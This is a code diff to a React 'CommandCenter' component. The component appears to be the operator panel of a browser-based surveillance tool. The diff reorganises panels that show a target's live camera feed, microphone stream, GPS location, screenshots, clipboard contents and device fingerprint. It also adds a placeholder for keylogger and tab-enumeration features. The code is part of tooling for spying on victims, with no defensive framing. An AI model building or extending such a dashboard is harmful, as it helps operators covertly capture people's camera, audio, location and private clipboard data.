@@ -6,6 +6,10 @@ import { useWebSocket } from "@/hooks/use-websocket";
 import { useToast } from "@/hooks/use-toast";
 import { Copy, Users, Activity, Shield, Globe, Eye, Camera, Mic, MapPin, Monitor, Terminal, Link2 } from "lucide-react";
 import { useQuery } from "@tanstack/react-query";
+import { Collapsible, CollapsibleTrigger, CollapsibleContent } from "@/components/ui/collapsible";
+import { Skeleton } from "@/components/ui/skeleton";
+import { Switch } from "@/components/ui/switch";
+import { Toggle } from "@/components/ui/toggle";
 
 interface CommandCenterProps {
   onExit: () => void;
@@ -436,13 +440,23 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
               ) : (
                 <div className="space-y-4">
                   {/* Camera Feed */}
-                  {targetData.camera && (
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
-                        <Camera className="w-4 h-4 mr-2" />
-                        Live Camera Feed
-                      </h4>
-                      {targetData.camera instanceof MediaStream ? (
+                  <Collapsible open={targetData.camera !== null} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                          <Camera className="w-4 h-4 mr-2" />
+                          Live Camera Feed
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">
+                            {targetData.camera ? 'Camera Stream Active' : 'Camera Stream Not Active'}
+                          </Badge>
+                          <Skeleton className="h-4 w-24" />
+                        </div>
+                      </div>
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      {targetData.camera && (
                         <div className="bg-black rounded aspect-video flex items-center justify-center">
                           <video 
                             ref={(video) => {
@@ -455,7 +469,8 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                             className="w-full h-full object-cover rounded"
                           />
                         </div>
-                      ) : (
+                      )}
+                      {!targetData.camera && (
                         <div className="bg-black rounded aspect-video flex items-center justify-center min-h-[180px]">
                           <span className="text-slate-400 text-center">Camera stream not available. Only metadata received.</span>
                           {targetData.camera?.tracks && (
@@ -463,22 +478,33 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                           )}
                         </div>
                       )}
-                    </div>
-                  )}
+                    </CollapsibleContent>
+                  </Collapsible>
 
                   {/* Microphone Data */}
-                  {targetData.microphone && (
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
-                        <Mic className="w-4 h-4 mr-2" />
-                        Microphone Access
-                      </h4>
-                      {targetData.microphone instanceof MediaStream ? (
+                  <Collapsible open={targetData.microphone !== null} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                          <Mic className="w-4 h-4 mr-2" />
+                          Microphone Access
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">
+                            {targetData.microphone ? 'Microphone Stream Active' : 'Microphone Stream Not Active'}
+                          </Badge>
+                          <Skeleton className="h-4 w-24" />
+                        </div>
+                      </div>
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      {targetData.microphone && (
                         <div className="flex items-center space-x-4">
                           <div className="w-4 h-4 bg-green-400 rounded-full animate-pulse"></div>
                           <span className="text-green-400 text-sm">Audio stream active</span>
                         </div>
-                      ) : (
+                      )}
+                      {!targetData.microphone && (
                         <div className="flex flex-col items-start space-y-2">
                           <span className="text-slate-400">Microphone stream not available. Only metadata received.</span>
                           {targetData.microphone?.tracks && (
@@ -486,161 +512,250 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                           )}
                         </div>
                       )}
-                    </div>
-                  )}
+                    </CollapsibleContent>
+                  </Collapsible>
 
                   {/* Location Data */}
-                  {targetData.location && (
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
-                        <MapPin className="w-4 h-4 mr-2" />
-                        Location Data
-                      </h4>
-                      <div className="space-y-1 text-sm">
-                        <p><span className="text-slate-400">Latitude:</span> {targetData.location.latitude}</p>
-                        <p><span className="text-slate-400">Longitude:</span> {targetData.location.longitude}</p>
-                        <p><span className="text-slate-400">Accuracy:</span> {targetData.location.accuracy}m</p>
+                  <Collapsible open={targetData.location !== null} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                          <MapPin className="w-4 h-4 mr-2" />
+                          Location Data
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">
+                            {targetData.location ? 'Location Data Received' : 'Location Data Not Received'}
+                          </Badge>
+                          <Skeleton className="h-4 w-24" />
+                        </div>
                       </div>
-                    </div>
-                  )}
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      {targetData.location && (
+                        <div className="space-y-1 text-sm">
+                          <p><span className="text-slate-400">Latitude:</span> {targetData.location.latitude}</p>
+                          <p><span className="text-slate-400">Longitude:</span> {targetData.location.longitude}</p>
+                          <p><span className="text-slate-400">Accuracy:</span> {targetData.location.accuracy}m</p>
+                        </div>
+                      )}
+                      {!targetData.location && (
+                        <div className="text-slate-400 text-center">Location data not available for this client.</div>
+                      )}
+                    </CollapsibleContent>
+                  </Collapsible>
 
                   {/* Permission Status */}
-                  <div className="bg-slate-900 rounded-lg p-4">
-                    <h4 className="text-red-400 font-medium mb-2 flex items-center">
-                      <Shield className="w-4 h-4 mr-2" />
-                      Permission Status
-                    </h4>
-                    <div className="space-y-2">
-                      {Object.entries(targetData.permissions).map(([permission, granted]) => (
-                        <div key={permission} className="flex items-center space-x-2">
-                          <div className={`w-3 h-3 rounded-full ${granted ? 'bg-green-400' : 'bg-red-400'}`}></div>
-                          <span className="text-sm text-slate-400 capitalize">{permission}</span>
-                          <Badge className={`${granted ? 'bg-green-500' : 'bg-red-500'} bg-opacity-20 text-xs`}>
-                            {granted ? 'Granted' : 'Denied'}
+                  <Collapsible open={Object.keys(targetData.permissions).length > 0} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                          <Shield className="w-4 h-4 mr-2" />
+                          Permission Status
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">
+                            {Object.keys(targetData.permissions).length > 0 ? 'Permissions Received' : 'Permissions Not Received'}
                           </Badge>
+                          <Skeleton className="h-4 w-24" />
                         </div>
-                      ))}
-                    </div>
-                  </div>
+                      </div>
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      {Object.keys(targetData.permissions).length > 0 ? (
+                        <div className="space-y-2">
+                          {Object.entries(targetData.permissions).map(([permission, granted]) => (
+                            <div key={permission} className="flex items-center space-x-2">
+                              <div className={`w-3 h-3 rounded-full ${granted ? 'bg-green-400' : 'bg-red-400'}`}></div>
+                              <span className="text-sm text-slate-400 capitalize">{permission}</span>
+                              <Badge className={`${granted ? 'bg-green-500' : 'bg-red-500'} bg-opacity-20 text-xs`}>
+                                {granted ? 'Granted' : 'Denied'}
+                              </Badge>
+                            </div>
+                          ))}
+                        </div>
+                      ) : (
+                        <div className="text-slate-400 text-center">Permission status not available for this client.</div>
+                      )}
+                    </CollapsibleContent>
+                  </Collapsible>
 
                   {/* Screenshot Data */}
-                  {targetData.screenshot && (
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
-                        <Camera className="w-4 h-4 mr-2" />
-                        Screenshot
-                      </h4>
-                      <div className="flex flex-col items-start space-y-2">
-                        <Badge className="bg-green-500 bg-opacity-20 text-green-400">Screenshot Received</Badge>
-                        <div className="bg-black rounded aspect-video flex items-center justify-center min-h-[180px]">
-                          <img 
-                            src={`data:${targetData.screenshot.type};base64,${targetData.screenshot.data}`} 
-                            alt="Screenshot" 
-                            className="w-full h-full object-contain rounded"
-                          />
+                  <Collapsible open={targetData.screenshot !== null} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                          <Camera className="w-4 h-4 mr-2" />
+                          Screenshot
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">
+                            {targetData.screenshot ? 'Screenshot Received' : 'Screenshot Not Received'}
+                          </Badge>
+                          <Skeleton className="h-4 w-24" />
                         </div>
-                        <Button 
-                          onClick={() => {
-                            navigator.clipboard.writeText(`data:${targetData.screenshot.type};base64,${targetData.screenshot.data}`);
-                            toast({
-                              title: "Screenshot Copied",
-                              description: "Screenshot data copied to clipboard",
-                            });
-                          }}
-                          size="sm"
-                          variant="outline"
-                          className="w-full"
-                        >
-                          <Copy className="w-4 h-4 mr-2" />
-                          Copy Screenshot Data
-                        </Button>
                       </div>
-                    </div>
-                  )}
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      {targetData.screenshot && (
+                        <div className="flex flex-col items-start space-y-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">Screenshot Received</Badge>
+                          <div className="bg-black rounded aspect-video flex items-center justify-center min-h-[180px]">
+                            <img 
+                              src={`data:${targetData.screenshot.type};base64,${targetData.screenshot.data}`} 
+                              alt="Screenshot" 
+                              className="w-full h-full object-contain rounded"
+                            />
+                          </div>
+                          <Button 
+                            onClick={() => {
+                              navigator.clipboard.writeText(`data:${targetData.screenshot.type};base64,${targetData.screenshot.data}`);
+                              toast({
+                                title: "Screenshot Copied",
+                                description: "Screenshot data copied to clipboard",
+                              });
+                            }}
+                            size="sm"
+                            variant="outline"
+                            className="w-full"
+                          >
+                            <Copy className="w-4 h-4 mr-2" />
+                            Copy Screenshot Data
+                          </Button>
+                        </div>
+                      )}
+                      {!targetData.screenshot && (
+                        <div className="text-slate-400 text-center">Screenshot not available for this client.</div>
+                      )}
+                    </CollapsibleContent>
+                  </Collapsible>
 
                   {/* Clipboard Data */}
-                  {targetData.clipboard && (
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
-                        <Copy className="w-4 h-4 mr-2" />
-                        Clipboard Data
-                      </h4>
-                      <div className="flex flex-col items-start space-y-2">
-                        <Badge className="bg-blue-500 bg-opacity-20 text-blue-400">Clipboard Data Received</Badge>
-                        <div className="bg-slate-700 rounded-md p-3 text-slate-200 text-sm break-all">
-                          {targetData.clipboard}
-                        </div>
-                        <Button 
-                          onClick={() => {
-                            navigator.clipboard.writeText(targetData.clipboard);
-                            toast({
-                              title: "Clipboard Copied",
-                              description: "Clipboard data copied to clipboard",
-                            });
-                          }}
-                          size="sm"
-                          variant="outline"
-                          className="w-full"
-                        >
+                  <Collapsible open={targetData.clipboard !== null} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
                           <Copy className="w-4 h-4 mr-2" />
-                          Copy Clipboard Data
-                        </Button>
+                          Clipboard Data
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">
+                            {targetData.clipboard ? 'Clipboard Data Received' : 'Clipboard Data Not Received'}
+                          </Badge>
+                          <Skeleton className="h-4 w-24" />
+                        </div>
                       </div>
-                    </div>
-                  )}
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      {targetData.clipboard && (
+                        <div className="flex flex-col items-start space-y-2">
+                          <Badge className="bg-blue-500 bg-opacity-20 text-blue-400">Clipboard Data Received</Badge>
+                          <div className="bg-slate-700 rounded-md p-3 text-slate-200 text-sm break-all">
+                            {targetData.clipboard}
+                          </div>
+                          <Button 
+                            onClick={() => {
+                              navigator.clipboard.writeText(targetData.clipboard);
+                              toast({
+                                title: "Clipboard Copied",
+                                description: "Clipboard data copied to clipboard",
+                              });
+                            }}
+                            size="sm"
+                            variant="outline"
+                            className="w-full"
+                          >
+                            <Copy className="w-4 h-4 mr-2" />
+                            Copy Clipboard Data
+                          </Button>
+                        </div>
+                      )}
+                      {!targetData.clipboard && (
+                        <div className="text-slate-400 text-center">Clipboard data not available for this client.</div>
+                      )}
+                    </CollapsibleContent>
+                  </Collapsible>
+
+                  {/* System Information */}
+                  <Collapsible open={targetData.systemInfo !== null} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                          <Monitor className="w-4 h-4 mr-2" />
+                          System Information
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-green-500 bg-opacity-20 text-green-400">
+                            {targetData.systemInfo ? 'System Info Received' : 'System Info Not Received'}
+                          </Badge>
+                          <Skeleton className="h-4 w-24" />
+                        </div>
+                      </div>
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      {targetData.systemInfo ? (
+                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                          <div className="bg-slate-900 rounded-lg p-4">
+                            <h4 className="text-green-400 font-medium mb-2">Browser Details</h4>
+                            <div className="space-y-1 text-sm">
+                              <p><span className="text-slate-400">User Agent:</span></p>
+                              <p className="text-slate-300 text-xs break-all">{targetData.systemInfo.userAgent}</p>
+                              <p><span className="text-slate-400">Platform:</span> {targetData.systemInfo.platform}</p>
+                              <p><span className="text-slate-400">Language:</span> {targetData.systemInfo.language}</p>
+                            </div>
+                          </div>
+                          <div className="bg-slate-900 rounded-lg p-4">
+                            <h4 className="text-green-400 font-medium mb-2">Display Information</h4>
+                            <div className="space-y-1 text-sm">
+                              <p><span className="text-slate-400">Screen Resolution:</span> {targetData.systemInfo.screenWidth}x{targetData.systemInfo.screenHeight}</p>
+                              <p><span className="text-slate-400">Color Depth:</span> {targetData.systemInfo.colorDepth}-bit</p>
+                              <p><span className="text-slate-400">Timezone:</span> {targetData.systemInfo.timezone}</p>
+                            </div>
+                          </div>
+                          <div className="bg-slate-900 rounded-lg p-4">
+                            <h4 className="text-green-400 font-medium mb-2">Capabilities</h4>
+                            <div className="space-y-1 text-sm">
+                              <p><span className="text-slate-400">HTTPS:</span> {targetData.systemInfo.isHttps ? 'Yes' : 'No'}</p>
+                              <p><span className="text-slate-400">Cookies:</span> {targetData.systemInfo.cookieEnabled ? 'Enabled' : 'Disabled'}</p>
+                              <p><span className="text-slate-400">Online:</span> {targetData.systemInfo.onLine ? 'Yes' : 'No'}</p>
+                              <p><span className="text-slate-400">WebRTC:</span> {targetData.systemInfo.webRTC ? 'Available' : 'Not Available'}</p>
+                            </div>
+                          </div>
+                        </div>
+                      ) : (
+                        <div className="text-slate-400 text-center py-8">System information not available for this client.</div>
+                      )}
+                    </CollapsibleContent>
+                  </Collapsible>
+
+                  {/* Advanced Features (Placeholder) */}
+                  <Collapsible open={false} onOpenChange={() => {}}>
+                    <CollapsibleTrigger asChild>
+                      <div className="bg-slate-900 rounded-lg p-4 cursor-pointer">
+                        <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                          <Users className="w-4 h-4 mr-2" />
+                          Advanced Features
+                        </h4>
+                        <div className="flex items-center space-x-2">
+                          <Badge className="bg-yellow-500 bg-opacity-20 text-yellow-400">
+                            Placeholder
+                          </Badge>
+                          <Skeleton className="h-4 w-24" />
+                        </div>
+                      </div>
+                    </CollapsibleTrigger>
+                    <CollapsibleContent>
+                      <div className="text-slate-400 text-center py-8">
+                        <p>Keylogger and Tab Enumeration features are not yet implemented.</p>
+                        <p>This section will display status and data when available.</p>
+                      </div>
+                    </CollapsibleContent>
+                  </Collapsible>
                 </div>
               )}
             </CardContent>
           </Card>
         </div>
-
-        {/* System Information */}
-        {selectedClient && (
-          <div className="mt-6">
-            <Card className="bg-slate-800 border-slate-600">
-              <CardHeader>
-                <CardTitle className="text-slate-200 flex items-center">
-                  <Monitor className="text-green-400 mr-2" />
-                  System Information
-                </CardTitle>
-              </CardHeader>
-              <CardContent>
-                {targetData.systemInfo ? (
-                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-green-400 font-medium mb-2">Browser Details</h4>
-                      <div className="space-y-1 text-sm">
-                        <p><span className="text-slate-400">User Agent:</span></p>
-                        <p className="text-slate-300 text-xs break-all">{targetData.systemInfo.userAgent}</p>
-                        <p><span className="text-slate-400">Platform:</span> {targetData.systemInfo.platform}</p>
-                        <p><span className="text-slate-400">Language:</span> {targetData.systemInfo.language}</p>
-                      </div>
-                    </div>
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-green-400 font-medium mb-2">Display Information</h4>
-                      <div className="space-y-1 text-sm">
-                        <p><span className="text-slate-400">Screen Resolution:</span> {targetData.systemInfo.screenWidth}x{targetData.systemInfo.screenHeight}</p>
-                        <p><span className="text-slate-400">Color Depth:</span> {targetData.systemInfo.colorDepth}-bit</p>
-                        <p><span className="text-slate-400">Timezone:</span> {targetData.systemInfo.timezone}</p>
-                      </div>
-                    </div>
-                    <div className="bg-slate-900 rounded-lg p-4">
-                      <h4 className="text-green-400 font-medium mb-2">Capabilities</h4>
-                      <div className="space-y-1 text-sm">
-                        <p><span className="text-slate-400">HTTPS:</span> {targetData.systemInfo.isHttps ? 'Yes' : 'No'}</p>
-                        <p><span className="text-slate-400">Cookies:</span> {targetData.systemInfo.cookieEnabled ? 'Enabled' : 'Disabled'}</p>
-                        <p><span className="text-slate-400">Online:</span> {targetData.systemInfo.onLine ? 'Yes' : 'No'}</p>
-                        <p><span className="text-slate-400">WebRTC:</span> {targetData.systemInfo.webRTC ? 'Available' : 'Not Available'}</p>
-                      </div>
-                    </div>
-                  </div>
-                ) : (
-                  <div className="text-slate-400 text-center py-8">System information not available for this client.</div>
-                )}
-              </CardContent>
-            </Card>
-          </div>
-        )}
       </div>
     </div>
   );
